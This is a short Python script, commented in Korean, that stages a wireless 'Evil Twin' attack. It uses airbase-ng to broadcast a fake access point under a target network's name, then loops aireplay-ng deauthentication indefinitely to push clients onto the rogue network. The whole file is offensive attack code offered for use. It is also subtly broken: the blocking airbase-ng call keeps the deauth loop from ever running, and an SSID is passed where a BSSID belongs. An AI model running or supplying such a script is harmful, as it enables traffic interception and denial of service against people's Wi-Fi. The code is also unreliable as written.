import subprocess
import time

# Evil Twin AP 생성 및 deauth 공격을 실행하는 함수
def start_evil_twin(target_ssid, interface="wlan0"):
    try:
        # 가짜 AP (Evil Twin) 생성
        print(f"{target_ssid} 네트워크에 대한 가짜 AP 생성 중...")
        subprocess.run(['sudo', 'airbase-ng', '-e', target_ssid, '-c', '6', interface])

        # 일정 시간 대기 (가짜 AP 생성 대기)
        time.sleep(5)

        # deauth 공격을 계속해서 시도 (기존 AP에서 연결을 끊고, 가짜 AP에 유도)
        print(f"{target_ssid}에 대한 지속적인 deauth 공격 시작...")
        while True:
            subprocess.run(['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_ssid, interface])
            time.sleep(1)  # 1초 간격으로 공격 반복
    except Exception as e:
        print(f"Evil Twin 생성 및 deauth 공격 중 오류 발생: {e}")
